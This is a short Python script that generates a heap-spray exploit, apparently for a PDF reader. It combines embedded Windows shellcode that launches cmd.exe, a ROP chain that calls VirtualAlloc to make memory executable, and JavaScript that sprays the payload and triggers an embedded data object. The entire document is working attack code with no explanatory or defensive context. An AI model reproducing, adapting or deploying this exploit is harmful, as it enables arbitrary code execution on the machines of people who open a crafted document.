import struct, sys

def p32(v):
    return struct.pack('<I', v)

if len(sys.argv) > 1:
    payload = open(sys.argv[1],"rb").read()
else:
    payload = "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x6d\x64\x2e\x65\x78\x65\x00"

sc = "\x90"*128 + payload
sc += "\x90"*(1020-len(sc))
assert len(sc) == 1020
rop = ""
rop += p32(0x10095ded)# 0x10095ded : pop eax ; pop ebp ; ret
rop += p32(0x10097134)# 0x10097134 : ptr[VirtualAlloc]
rop += p32(0x1000786f)# 0x1000786f : xchg eax, esp ; ret
rop += p32(0x1002fa4c)# 0x1002fa4c : jmp dword ptr [eax]
rop += p32(0x10091d6b)# 0x10091d67 : pop ebp ; pop ebx ; pop ecx ; pop ecx ; ret
rop += p32(0x00000000)# lpAddress
rop += p32(0x00001000)# dwSize
rop += p32(0x00001000)# flAllocationType
rop += p32(0x00000040)# flProtect PAGE_EXECUTE_READWRITE 0x40
rop += p32(0x100025ad)# 0x100025ad : pop esi ; ret
rop += p32(0x288080f0)
rop += p32(0x1000100e)# 0x1000100e : pop ecx ; ret
rop += p32(0x00000100)# len(sc)/4
rop += p32(0x1008078f)# 0x1008078f : mov edi, eax ; rep movsd dword ptr es:[edi], dword ptr [esi] ; pop edi ; pop esi ; ret
rop += p32(0x100079d9)# 0x100079d9 : call eax
rop += p32(0x100079d9)# 0x100079d9 : call eax

def escape(addr):
    return "%%u%s%%u%s" % ((addr[1]+addr[0]).encode("hex"),(addr[3]+addr[2]).encode("hex"))

def escape_str(sc):
    return "".join(map(escape,[sc[i:i+4] for i in xrange(0,len(sc),4)]))

js = '''var shellcode = unescape("%s%s");
var spray     = unescape("%s");
var sl        = shellcode.length;
var sp        = spray.length;
spray = spray+shellcode;
do {
   spray += spray.substring(0,sp);
} while(spray.length < 0xd0000);
spray = spray.substring(0, 0xd0000);
memory = new Array();
for(i = 0; i < 0x1000; i++) {
   var tmp = spray;
   memory[i] = tmp.substring(0, i * 0x100)+String.fromCharCode(i%%0x100);
}
var x = this.dataObjects[0].name;
this.exportDataObject({cName: x, nLaunch: 2});''' % (escape(p32(0x100079d9)), escape_str(sc), escape_str(rop))
print js
